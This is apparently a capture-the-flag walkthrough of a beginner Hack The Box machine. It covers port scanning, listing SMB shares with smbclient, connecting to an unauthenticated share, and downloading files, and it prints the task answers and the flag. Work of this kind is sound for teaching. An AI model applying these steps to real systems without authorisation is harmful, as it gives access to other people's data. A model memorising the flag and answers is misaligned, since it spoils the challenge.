# Tasks
- What does the 3-letter acronym SMB stand for?
	- Server Message Block
- What port does SMB use to operate at?
	- 445
- What is the service name for port 445 that came up in our Nmap scan?
	- microsoft-ds
- What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
	- -L (needs to be capital, -l represents a different option)
- How many shares are there on Dancing?
	- 4
- What is the name of the share we are able to access in the end with a blank password?
	- WorkShares
- What is the command we can use within the SMB shell to download the files we find?
	- get
- Submit root flag
	- 5f61c10dffbc77a704d76016a22f1664


# Steps
- First, we can start off with an initial rustscan:
```
rustscan --ulimit 5000 --addresses "10.129.1.12" --top -- -sC -sV
```
- We are given a bunch of open ports to us, one notable including SMB.
```
PORT      STATE SERVICE       REASON          VERSION  
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds? syn-ack ttl 127  
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: 3h59m54s  
| smb2-time:    
|   date: 2025-11-21T05:01:39  
|_  start_date: N/A  
| smb2-security-mode:    
|   311:    
|_    Message signing enabled but not required  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 65128/tcp): CLEAN (Couldn't connect)  
|   Check 2 (port 31084/tcp): CLEAN (Couldn't connect)  
|   Check 3 (port 56298/udp): CLEAN (Timeout)  
|   Check 4 (port 15467/udp): CLEAN (Failed to receive data)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
- Now that we confirmed the existence of SMB (Server Message Block), we are able to use smbclient to interact with it.
- First, we'll go ahead and list what shares are available to us:
```
smbclient -L //10.129.1.12
```
- We are given a few options, but n otably, we didn't need a password for the Administrator user at all, which is something interesting to note.
- The results follow as what is shown below:
```
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
       WorkShares      Disk         
SMB1 disabled -- no workgroup available
```
- Alright, interesting. So, we will want to connect to the default share, since that will put us in the root of the C directory, but allowing us to move around the file system as needed.
- However, it seems that it asks a password this time since we are denied entry:
```
[Nov 20, 2025 - 17:04:41 (PST)] exegol-htb-starting-point /workspace # smbclient //10.129.1.12/C$                      
Password for [WORKGROUP\root]:  
tree connect failed: NT_STATUS_ACCESS_DENIED
```
- Switching to the Remote Admin share, we get the same thing:
```
[Nov 20, 2025 - 17:07:10 (PST)] exegol-htb-starting-point /workspace # smbclient //10.129.1.12/ADMIN$  
Password for [WORKGROUP\root]:  
tree connect failed: NT_STATUS_ACCESS_DENIED  
[Nov 20, 2025 - 17:08:10 (PST)] exegol-htb-starting-point /workspace #
```
- However, after trying the Workshares, then we are able to get it! From here, we are able to get the existence of two folders
```
[Nov 20, 2025 - 17:08:10 (PST)] exegol-htb-starting-point /workspace # smbclient //10.129.1.12/WorkShares  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Mon Mar 29 01:22:01 2021  
 ..                                  D        0  Mon Mar 29 01:22:01 2021  
 Amy.J                               D        0  Mon Mar 29 02:08:24 2021  
 James.P                             D        0  Thu Jun  3 01:38:03 2021  
  
               5114111 blocks of size 4096. 1734198 blocks available  
smb: \>
```
- Going into Amy.J, we only find a worknotes file. Doubt it's the flag, but we'll download a copy anyways
```
[Nov 20, 2025 - 17:08:10 (PST)] exegol-htb-starting-point /workspace # smbclient //10.129.1.12/WorkShares  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Mon Mar 29 01:22:01 2021  
 ..                                  D        0  Mon Mar 29 01:22:01 2021  
 Amy.J                               D        0  Mon Mar 29 02:08:24 2021  
 James.P                             D        0  Thu Jun  3 01:38:03 2021  
  
               5114111 blocks of size 4096. 1734198 blocks available  
smb: \> cd Amy.J\  
smb: \Amy.J\> ls  
 .                                   D        0  Mon Mar 29 02:08:24 2021  
 ..                                  D        0  Mon Mar 29 02:08:24 2021  
 worknotes.txt                       A       94  Fri Mar 26 04:00:37 2021  
  
               5114111 blocks of size 4096. 1734198 blocks available  
smb: \Amy.J\> get worknotes.txt  
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)  
smb: \Amy.J\>
```
- Sure enough, we are able to find a flag file, so we download a copy onto our machine
```
smb: \Amy.J\> cd ..  
smb: \> ls  
 .                                   D        0  Mon Mar 29 01:22:01 2021  
 ..                                  D        0  Mon Mar 29 01:22:01 2021  
 Amy.J                               D        0  Mon Mar 29 02:08:24 2021  
 James.P                             D        0  Thu Jun  3 01:38:03 2021  
  
               5114111 blocks of size 4096. 1733863 blocks available  
smb: \> cd James.P\  
smb: \James.P\> ls  
 .                                   D        0  Thu Jun  3 01:38:03 2021  
 ..                                  D        0  Thu Jun  3 01:38:03 2021  
 flag.txt                            A       32  Mon Mar 29 02:26:57 2021  
  
               5114111 blocks of size 4096. 1733863 blocks available  
smb: \James.P\> get flag.txt  
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)  
smb: \James.P\>
```
- We are then able to get the flag!
```
[Nov 20, 2025 - 17:10:59 (PST)] exegol-htb-starting-point /workspace # ls  
flag.txt  worknotes.txt  
[Nov 20, 2025 - 17:11:00 (PST)] exegol-htb-starting-point /workspace # cat flag.txt    
5f61c10dffbc77a704d76016a22f1664#
```
- It's not notable, but for completeness, worknotes.txt has this in it:
```
[Nov 20, 2025 - 17:11:01 (PST)] exegol-htb-starting-point /workspace # cat worknotes.txt      
- start apache server on the linux machine  
- secure the ftp server  
- setup winrm on dancing #
```
- Seems like they were trying to get around to securing the machine, but obviously didn't.